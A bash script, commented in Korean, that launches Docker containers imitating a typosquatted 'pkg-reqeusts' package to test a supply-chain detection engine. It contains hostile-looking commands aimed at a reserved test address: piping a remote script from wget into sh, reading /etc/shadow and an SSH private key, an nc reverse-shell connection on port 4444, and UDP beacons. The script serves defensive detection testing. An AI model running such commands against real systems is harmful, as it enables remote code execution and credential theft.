#!/usr/bin/env bash
# 타이포스쿼팅 패키지를 흉내 낸 데모 컨테이너(pkg-reqeusts). 전부 무해한 시뮬레이션이다.
#
#   SCENARIO=all|shell|revshell|direct-ip|domain|udp   (기본 all = 아래 순서로 하나씩)
#   LOOP=1  각 시나리오를 10초마다 반복
#   DRY=1   docker 를 부르지 않고 넘길 인자만 출력(시나리오 분리 확인용)
#
# 시나리오마다 컨테이너를 따로 띄우고, 그 시나리오의 코드만 넘긴다.
# (한 덩어리로 넘기면 PID1 인자에 다른 시나리오의 문자열이 섞여 엉뚱한 규칙에 먼저 걸린다.)
#   shell     busybox  외부 스크립트 실행 패턴 + 민감 파일 열기 시도
#   revshell  busybox  nc 로 203.0.113.7:4444 TCP (reverse-shell-ports + no-shell-download 가 함께 걸리는 게 의도)
#   direct-ip python   DNS 없이 203.0.113.7:443 TCP
#   domain    python   example.com:443 TCP (IANA 예약 도메인, 실제로 해석됨 → 목적지 도메인이 붙는다)
#   udp       python   203.0.113.7:53·4444 UDP 2개 — 엔진이 TCP 만 보므로 "보이지 않는" 음성 대조군
#
# 참고: TEST-NET 목적지는 접속이 실패할 때(타임아웃 약 3초 뒤) connect 이벤트가 나오므로
#       격리도 그 뒤에 일어난다. 실제로 도달 가능한 서버면 즉시 나온다.
set -euo pipefail
name=${NAME:-pkg-reqeusts}
scenario=${SCENARIO:-all}
BUSYBOX=busybox
PYTHON=python:3.12-slim

# ── busybox 시나리오 본문 (sh) ─────────────────────────────────────────
sh_shell='echo "[demo] shell start"
timeout 3 sh -c "wget -q -O- http://203.0.113.7/p.sh | sh" || true
cat /etc/shadow >/dev/null 2>&1 || true
cat /root/.ssh/id_rsa >/dev/null 2>&1 || true'

sh_revshell='echo "[demo] revshell start"
timeout 3 nc 203.0.113.7 4444 </dev/null >/dev/null 2>&1 || true'

# ── python 시나리오 본문 ──────────────────────────────────────────────
py_direct_ip='print("[demo] direct-ip start", flush=True)
try:
    socket.create_connection(("203.0.113.7", 443), timeout=3).close()
except OSError as e:
    print("[demo]   203.0.113.7:443 (no DNS)", type(e).__name__, flush=True)'

py_domain='print("[demo] domain start", flush=True)
try:
    socket.create_connection(("example.com", 443), timeout=3).close()
    print("[demo]   example.com:443 connected", flush=True)
except OSError as e:
    print("[demo]   example.com:443", type(e).__name__, flush=True)'

py_udp='print("[demo] udp start (negative control: UDP is not observed)", flush=True)
for port in (53, 4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(b"beacon", ("203.0.113.7", port))
    except OSError as e:
        print("[demo]   udp", port, type(e).__name__, flush=True)
    finally:
        s.close()'

# 시나리오 id → (이미지, 명령) 조립. 선택된 시나리오의 본문만 들어간다.
build() {
  local id=$1 body
  case "$id" in
    shell|revshell)
      [ "$id" = shell ] && body=$sh_shell || body=$sh_revshell
      image=$BUSYBOX
      cmd=(sh -c "while :; do
$body
[ -n \"\$LOOP\" ] || break; sleep 10; done; echo \"[demo] done; idling\"; sleep 3600")
      ;;
    direct-ip|domain|udp)
      case "$id" in direct-ip) body=$py_direct_ip ;; domain) body=$py_domain ;; udp) body=$py_udp ;; esac
      image=$PYTHON
      cmd=(python3 -c "import os, socket, time
while True:
$(printf '%s\n' "$body" | sed 's/^/    /')
    if not os.environ.get(\"LOOP\"):
        break
    time.sleep(10)
print(\"[demo] done; idling\", flush=True)
time.sleep(3600)")
      ;;
    *) echo "unknown SCENARIO=$id (all|shell|revshell|direct-ip|domain|udp)" >&2; exit 1 ;;
  esac
}

launch() {
  local id=$1
  build "$id"
  local args=(run -d --name "$name" --label supplyguard.demo=attacker
              -e SCENARIO="$id" -e LOOP="${LOOP:-}" "$image" "${cmd[@]}")
  if [ -n "${DRY:-}" ]; then
    echo "### SCENARIO=$id"
    printf 'docker'; printf ' %q' "${args[@]}"; echo
    return
  fi
  docker rm -f "$name" >/dev/null 2>&1 || true
  docker "${args[@]}" >/dev/null
  echo "$name started (SCENARIO=$id, $image)"
  docker logs -f "$name" 2>&1 | sed 's/^/  /' &
  sleep 8; kill $! 2>/dev/null || true
  docker ps -a --filter "name=$name" --format 'status: {{.Status}}'
}

if [ "$scenario" = all ]; then
  for id in shell revshell direct-ip domain udp; do launch "$id"; done
else
  launch "$scenario"
fi
